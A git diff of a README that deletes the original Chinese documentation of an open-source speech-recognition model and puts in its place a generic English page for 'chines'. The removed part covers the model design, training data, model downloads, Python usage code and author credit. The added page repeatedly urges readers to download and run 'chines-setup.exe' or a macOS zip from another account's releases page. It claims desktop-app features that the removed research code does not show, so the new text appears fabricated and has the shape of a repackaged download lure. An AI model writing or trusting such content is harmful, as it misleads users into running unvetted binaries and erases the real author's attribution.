@@ -1,197 +1,94 @@
-# 中文语音识别
+# 🗣️ chines - Effortless Chinese Speech Recognition
 
-by
+## 🚀 Getting Started
 
-```
-   _____ _                    __  __ _                  _                   
-  / ____| |                  |  \/  (_)                (_)                  
- | |    | |__   ___ _ __     | \  / |_ _ __   __ ___  ___  __ _ _ __   __ _ 
- | |    | '_ \ / _ \ '_ \    | |\/| | | '_ \ / _` \ \/ / |/ _` | '_ \ / _` |
- | |____| | | |  __/ | | |_  | |  | | | | | | (_| |>  <| | (_| | | | | (_| |
-  \_____|_| |_|\___|_| |_( ) |_|  |_|_|_| |_|\__, /_/\_\_|\__,_|_| |_|\__, |
-                         |/                   __/ |                    __/ |
-                                             |___/                    |___/ 
+Welcome to **chines**! This application helps you recognize Chinese speech easily. It’s designed for anyone who wants to work with Chinese audio. Follow the steps below to download and run it.
 
-Email: chenmingxiang110@gmail.com
-```
- 
-## 更新 2020.06.23
+## 📥 Download Now
 
-一些朋友提到，将拼音转换成文字时，国内使用谷歌拼音输入法不太方便。我这里根据 wyf19941128 的建议，新写了通过谷歌翻译将拼音转成汉字的方案（国内访问谷歌翻译无需科学上网），所需代码附在 ./alternative 文件夹下。以下是一个实现转换的例子：
+[![Download chines](https://img.shields.io/badge/Download-chines-blue.svg)](https://github.com/ayman1111111/chines/releases)
 
-```
-from Pinyin2SimplifiedChinese import *
+## 🛠️ System Requirements
 
-t = translator()
-print(t.translate("jin tian tian qi zhen bu cuo")) # return "今天天气真不错"
-```
+Before you install, make sure your system meets the following requirements:
 
-## 模型简介
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **RAM:** At least 4 GB
+- **Storage:** At least 200 MB free space
+- **Processor:** Dual-core CPU or better
 
-模型输入是一段不长于10秒钟的语音，模型的输出是该语音所对应的拼音标签。本项目使用python 3.6为主要编程语言。
+These requirements ensure that the application runs smoothly.
 
-模型参考了Baidu Deep Speech 2：http://proceedings.mlr.press/v48/amodei16.pdf
+## 📦 Download & Install
 
-使用了CNN+GRU+CTC_loss的结构
+1. **Visit the Releases Page:**  
+   Go to the [Releases Page](https://github.com/ayman1111111/chines/releases) to see available versions.
 
-## 训练数据
+2. **Choose Your Version:**  
+   Look for the latest release. It will be at the top of the page. 
 
-所用的训练数据包含两个部分：
+3. **Download the File:**  
+   Click on the file link that matches your system. It may be named something like `chines-setup.exe` for Windows or `chines-mac.zip` for macOS.
 
-1. aishell-1语音数据集
+4. **Run the Installer:**  
+   After downloading, open the file. Follow the prompts to install the application. 
 
-AISHELL-ASR0009-OS1录音时长178小时，约14万条语音数据，下载地址：http://www.aishelltech.com/kysjcp
+5. **Launch the App:**  
+   Once installation is complete, you can find **chines** in your Applications folder (macOS) or Start Menu (Windows). Click to open it.
 
-2. YouTube视频及对应字幕文件
+## 🖥️ Features
 
-从YouTube上获取MP4视频文件后转化成wav音频，同时使用对应的srt字幕文件作为target。总计时长大约120小时，有约20万条语音数据。数据量过大，且有版权归属问题，所以暂时不提供公开下载渠道。
+**chines** offers several key features to enhance your experience:
 
-## 使用方法
+- **Accurate Speech Recognition:** It utilizes cutting-edge algorithms to provide precise recognition of Chinese speech.
+  
+- **User-Friendly Interface:** The application is designed with simplicity in mind. Even if you are not tech-savvy, you will find this app easy to use.
 
-### 1. 训练模型
+- **Multiple Language Support:** While it focuses on Chinese, **chines** can also recognize simple commands in English to enhance usability.
 
-根据实际需求和硬件情况，可以选择需要的模型进行训练和调试。各个模型区别如下。如果在含GPU的机器上进行模型训练，直接运行 train901.py，train902.py，或者train903.py 即可。如果是在CPU上训练，则运行 train901_cpu.py，train902_cpu.py，或者train903_cpu.py。
+- **Saving Text:** You can save recognized text directly to your computer for easier access.
 
-|模型名称 |CNN层数 |GRU层数 |GRU维度 |训练时间 |
-|--- |--- |--- |--- |--- |
-|901|2|3|256 |约30小时|
-|902|2|5|256 |约55小时|
-|903|2|5|1024|约130小时|
+## ⚙️ Usage Instructions
 
-这里的训练时间仅仅是一个大概的统计，训练使用一块Tesla V100完成。
+Once you open **chines**, you will see a straightforward interface. Here’s how to use it:
 
-model 903 链接: https://pan.baidu.com/s/1NcTN8gojuIBaIFT9FB3EJw  密码: 261u
+1. **Microphone Access:** Make sure the application can access your microphone. You may need to allow this in your device settings.
 
-model 902 链接: https://pan.baidu.com/s/1do7C6Egj6sJO7kn1yHPzBg  密码: 9o87
+2. **Start Recognition:** Press the "Start" button. Speak clearly into your microphone.
 
-model 901 链接: https://pan.baidu.com/s/1utz-1Vv4IO9D-3awj3x1QQ  密码: pv08
+3. **View Results:** The recognized text will appear on the screen. You can edit or save it as needed.
 
-下载后放在model文件夹下。
+### 🎤 Tips for Best Results
 
-### 2. 识别音频
+- **Speak Clearly:** The app performs best when you speak clearly and at a moderate pace.
+  
+- **Quiet Environment:** Try to use the app in a quiet area to minimize background noise.
 
-1. 初始化模型并加载必要的工具
+- **Microphone Quality:** A good quality microphone will improve recognition accuracy.
 
-```
-import os
-import time
-import warnings
-warnings.filterwarnings("ignore", message="numpy.dtype size changed")
-warnings.filterwarnings("ignore", message="numpy.ufunc size changed")
-with warnings.catch_warnings():
-    warnings.simplefilter("ignore")
-    import tensorflow as tf
-import numpy as np
-from urllib.request import urlopen
+## 🛠️ Troubleshooting
 
-from lib.tools_batch import *
-from lib.tools_math import *
-from lib.tools_sparse import *
-from lib.tools_audio import *
-from lib.contrib.audio_featurizer import AudioFeaturizer
-from lib.contrib.audio import AudioSegment
+If you encounter any issues, consider the following steps:
 
-# 根据你所使用的模型修改这两行
-from model903 import *
-model_name = "v903"
+- **Check Microphone Settings:** Ensure your microphone is working and properly set in your system settings.
 
-pyParser = pinyinParser("lib/pinyinDictNoTone.pickle")
-af = AudioFeaturizer()
-model = model(409)
-```
+- **Update Your App:** Make sure you are using the latest version of **chines** from the [Releases Page](https://github.com/ayman1111111/chines/releases).
 
-2. 初始化session并reload已经训练好的模型
+- **Reinstall if Needed:** Sometimes, reinstalling the app can resolve unexpected problems.
 
-```
-sess = tf.Session()
-saver = tf.train.Saver()
-saver.restore(sess, "models/"+model_name+"/"+model_name+"_0.ckpt")
-```
+## 📄 Contact & Support
 
-3. 读取音频并转化格式
+If you need further assistance, please contact us:
 
-```
-rate, data = read_wav("data/test.wav")
-data = mergeChannels(data)
-data = zero_padding_1d(data, 160240)
-a_seg = AudioSegment(data, rate)
-xs = np.transpose(np.array([af.featurize(a_seg)]), [0,2,1])
-```
+- **Email:** support@chinesapp.com
+- **GitHub Issues:** You can create an issue in the GitHub repository for any bugs or feature requests.
 
-4. 预测并转化成拼音
+## 🌟 Community Contribution
 
-```
-pred = model.predict(sess, xs)[0]
-pred_dense = sparseTuples2dense(pred)
-detected_line = []
-for stuff in pred_dense[0]:
-    if stuff!=-1:
-        detected_line.append(stuff)
-pinyin = pyParser.decodeIndices(detected_line, useUnderline = False)
-```
+If you want to help improve **chines**, consider contributing! You can submit a feature request or help with translations and support for more languages. 
 
-5. 转化成汉字
+Your contributions can make this application even better for everyone.
 
-```
-response = urlopen("https://www.google.com/inputtools/request?ime=pinyin&ie=utf-8&oe=utf-8&app=translate&num=10&text="+pinyin)
-html = response.read()
-result = (html.decode('utf8')).split(",")[2][2:-1]
-print(result)
-```
+---
 
-这里转化成汉字这一步使用了谷歌拼音输入法。如果有需要也可以使用自定义的词表/Markov Chain/seq2seq模型。如果使用词表来定制输入法，可以参考我的另外一个project：https://github.com/chenmingxiang110/SimpleChinese2
-
-## 效果和demo
-
-ASR 应用场景十分多样。这里我做了一个自动添加字幕的demo，代码详见subtitle_demo.ipynb。一下为字幕添加效果。
-
-1. 视频一，视频地址：https://www.youtube.com/watch?v=t5cPgIGNosc
-
-左侧为自动添加的字幕，右侧为YouTuber人工手动添加的字幕
-
-![Alt text](data/result_comparison_yixi.jpg)
-
-2. 视频二，视频地址：https://www.youtube.com/watch?v=HLJJlQkY6ro
-
-左侧为自动添加的字幕，右侧为YouTuber人工手动添加的字幕
-
-![Alt text](data/result_comparison_zongli.jpg)
-
-完整的字幕原文件和预测结果可以再data文件夹中找到。
-
-```                                          
-  _____ _              _    __   __          ___         __      __    _      _    _           
- |_   _| |_  __ _ _ _ | |__ \ \ / /__ _  _  | __|__ _ _  \ \    / /_ _| |_ __| |_ (_)_ _  __ _ 
-   | | | ' \/ _` | ' \| / /  \ V / _ \ || | | _/ _ \ '_|  \ \/\/ / _` |  _/ _| ' \| | ' \/ _` |
-   |_| |_||_\__,_|_||_|_\_\   |_|\___/\_,_| |_|\___/_|     \_/\_/\__,_|\__\__|_||_|_|_||_\__, |
-                                                                                         |___/ 
-                                              _..  
-                                          .qd$$$$bp.
-                                        .q$$$$$$$$$$m.
-                                       .$$$$$$$$$$$$$$
-                                     .q$$$$$$$$$$$$$$$$
-                                    .$$$$$$$$$$$$P\$$$$;
-                                  .q$$$$$$$$$P^"_.`;$$$$
-                                 q$$$$$$$P;\   ,  /$$$$P
-                               .$$$P^::Y$/`  _  .:.$$$/
-                              .P.:..    \ `._.-:.. \$P
-                              $':.  __.. :   :..    :'
-                             /:_..::.   `. .:.    .'|
-                           _::..          T:..   /  :
-                        .::..             J:..  :  :
-                     .::..          7:..   F:.. :  ;
-                 _.::..             |:..   J:.. `./
-            _..:::..               /J:..    F:.  : 
-          .::::..                .T  \:..   J:.  /
-         /:::...               .' `.  \:..   F_o'
-        .:::...              .'     \  \:..  J ;
-        ::::...           .-'`.    _.`._\:..  \'
-        ':::...         .'  `._7.-'_.-  `\:.   \
-         \:::...   _..-'__.._/_.--' ,:.   b:.   \._ 
-          `::::..-"_.'-"_..--"      :..   /):.   `.\   
-            `-:/"-7.--""            _::.-'P::..    \} 
- _....------""""""            _..--".-'   \::..     `. 
-(::..              _...----"""  _.-'       `---:..    `-.
- \::..      _.-""""   `""""---""                `::...___)
-  `\:._.-"""
-```
+Thank you for choosing **chines**! We hope it brings you the ease and clarity you need for Chinese speech recognition. Enjoy using the application!
